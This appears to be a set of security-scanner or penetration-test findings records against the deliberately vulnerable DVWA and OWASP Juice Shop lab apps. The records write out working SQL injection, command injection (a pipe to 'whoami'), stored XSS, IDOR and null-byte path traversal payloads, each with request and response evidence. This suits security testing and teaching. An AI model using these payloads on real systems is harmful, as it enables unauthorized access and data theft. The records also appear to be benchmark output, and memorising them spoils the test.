findings.title: SQL Injection in DVWA SQLi id parameter (low security)
findings.response_evidence: [security=low] Boolean-based SQLi confirmed. TRUE payload `1' OR '1'='1` returned MULTIPLE seeded user records with surnames: admin (admin), Gordon Brown, Hack Me, Pablo Picasso, Bob Smith (5 records). FALSE payload `1' AND '1'='2` returned ZERO records (empty "User ID:" result, no First name/Surname rows). The differential boolean behavior proves SQL injection.

findings.title: OS Command Injection (pipe bypass) at DVWA medium security
findings.response_evidence: [security=medium] ';' and '&&' blacklisted, bypassed with pipe '127.0.0.1| whoami'. Response pre block contains web-process identity 'www-data'. Page confirmed 'Security Level: medium'.

findings.title: Stored XSS in DVWA guestbook mtxMessage (low security)
request_sequence: POST /vulnerabilities/xss_s/ with txtName=canary & mtxMessage=<script id="test_token">window.xss_flag=1</script> & btnSign=Sign Guestbook
findings.response_evidence: [security=low] Stored XSS confirmed. The 46-char canary `<script id="test_token">window.xss_flag=1</script>` was stored unsanitized in mtxMessage (fits maxlength=50). On rendering /vulnerabilities/xss_s/ in the authenticated browser, the injected script executed.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned 1. document.getElementById('test_token').outerHTML returned the exact injected tag: <script id="test_token">window.xss_flag=1</script>. Script executed in browser DOM context, proving stored XSS.

findings.title: Cross-User Basket Access / BOLA on /rest/basket/{id}
request_sequence: GET /rest/basket/6 as juiceshop_acct1 (own_basket_id=6, UserId 22) -> 200, basket contains Apple Juice (1000ml) qty=3

findings.response_evidence: Account 2 (acct2_bench@juiceshop.local, own_basket_id=7) requested /rest/basket/6 which belongs to Account 1 (UserId 22). Response HTTP 200 returned Account 1's basket: {"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"BasketId":6,"quantity":3}}]}. Distinct seeded item Apple Juice (1000ml) qty=3 belonging to acct1 was disclosed to acct2. Endpoint performs no owner authorization check (IDOR/BOLA).

findings.title: Login Authentication-Bypass SQL Injection on /rest/user/login
request_sequence: POST /rest/user/login (unauth) JSON {"email":"' OR 1=1--","password":"anything"} -> 200 with auth token for admin@juice-sh.op
findings.response_evidence: Injecting email=' OR 1=1-- with an arbitrary password returned HTTP 200 (vs HTTP 401 'Invalid email or password.' for bad creds). Response: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The SQLi caused authentication as the first user admin@juice-sh.op (bid=1), yielding a valid session token without valid credentials.

findings.title: Product-Search SQL Injection on /rest/products/search
request_sequence: GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- (unauth) -> HTTP 200 success with injected column values
findings.response_evidence: Error-based proof: q=qwert' returned HTTP 500 with body 'Error: SQLITE_ERROR: near "'%'": syntax error', confirming unsanitized input in the SQL query. UNION proof: q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- returned HTTP 200 without error and the injected column literals appeared in the result row: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. The 9-column UNION resolving into named JSON fields confirms attacker-controlled SQL and column count.

findings.title: Confidential Acquisitions Memo via Open Directory Listing (/ftp/)
findings.response_evidence:
Step 1: /ftp/ returns HTTP 200 browsable directory listing enumerating acquisitions.md (909 bytes) alongside coupons_2013.md.bak, package.json.bak, incident-support.kdbx, etc. Step 2: GET /ftp/acquisitions.md returns HTTP 200 (text/markdown) with the confidential memo. Distinctive excerpt: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..." and closing line "Our shareholders will be excited. It's true. No fake news." Both conditions (listing reveals doc + direct retrieval returns memo) met without authentication.

findings.title: Unauthenticated User-Feedback PII Exposure (author emails disclosed)
findings.response_evidence: Unauthenticated GET returns HTTP 200 with JSON {"status":"success","data":[...]} containing 8 feedback records. Multiple records disclose author email addresses embedded in comments without authentication, e.g. id=1 "...Highly recommended! (***in@juice-sh.op)", id=2 "Great shop! Awesome service! (***@juice-sh.op)", id=3 "Nothing useful available here! (***der@juice-sh.op)", id=4 "...my wallet at /juicy-nft... (***ereum@juice-sh.op)". These @juice-sh.op author email addresses constitute PII exposed to any unauthenticated client.

findings.title: Exposed Encryption-Keys Directory Listing (/encryptionkeys/)
findings.response_evidence: Unauthenticated GET /encryptionkeys/ returns HTTP 200 with a browsable directory listing (visible_text: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 ... premium.key 50 ..."). Listing exposes sensitive key files: jwt.pub (248 bytes) and premium.key (50 bytes), both accessible without authentication.

findings.title: Poison Null-Byte Path Traversal under /ftp/ bypasses extension filter to retrieve restricted .bak backup file
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (unauth) => HTTP 403 'Only .md and .pdf files are allowed!'
GET http://juiceshop:3000/ftp/package.json.bak%2500.md (unauth) => HTTP 200, returns package.json backup content
findings.response_evidence:
Step 1 — Raw backup path blocked: GET /ftp/package.json.bak returned HTTP 403 with body: "Error: Only .md and .pdf files are allowed!" originating from /juice-shop/build/routes/fileServer.js:55 (verify). This proves the server enforces an extension whitelist (.md/.pdf only).

Step 2 — Null-byte bypass succeeds: GET /ftp/package.json.bak%2500.md returned HTTP 200 (Content-Type: application/octet-stream) delivering the restricted backup file. The URL-encoded null byte (%2500 => %00) truncates the filename at the OS layer so the server-side .md whitelist check passes while the filesystem opens package.json.bak.

Distinctive excerpt proving restricted file content retrieved:
{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application",
  "homepage": "http://owasp-juice.shop",
  ...
  "dependencies": { "express": "~4.16", "sequelize": "~4", "sqlite3": "~3.1.13", "jsonwebtoken": "~8", ... }

Both required conditions demonstrated: 403 on raw .bak path AND HTTP 200 with file content via null-byte bypass.

findings.title: SQL Injection (numeric boolean bypass) at DVWA medium security
findings.response_evidence: [security=medium] Quotes escaped server-side, so numeric boolean injection used. TRUE (id=1 OR 1=1) returned multiple seeded records: Surname: admin, Surname: Brown, Surname: Me, Surname: Picasso, Surname: Smith (5 rows). FALSE (id=1 AND 1=2) returned zero records (no First name/Surname blocks). Page confirmed 'Security Level: medium'.

POST /vulnerabilities/sqli/session-input.php with id=1' OR '1'='1' # and Submit=Submit (stores injection in $_SESSION['id'])
GET /vulnerabilities/sqli/ -> renders TRUE case: returns all 5 seeded surnames (admin, Brown, Me, Picasso, Smith)
POST /vulnerabilities/sqli/session-input.php with id=1' AND '1'='2' # and Submit=Submit (FALSE control)
GET /vulnerabilities/sqli/ -> renders FALSE case: zero records returned
findings.response_evidence: [security=high] Confirmed Security Level: high active. TRUE payload `1' OR '1'='1' #` bypasses the appended LIMIT 1 via trailing comment and returns all 5 seeded user surnames: admin, Brown, Me, Picasso, Smith. FALSE control `1' AND '1'='2' #` returns ZERO records. The boolean differential (5 surnames vs 0 rows) proves SQL injection in the out-of-band session-input id parameter at DVWA high security.
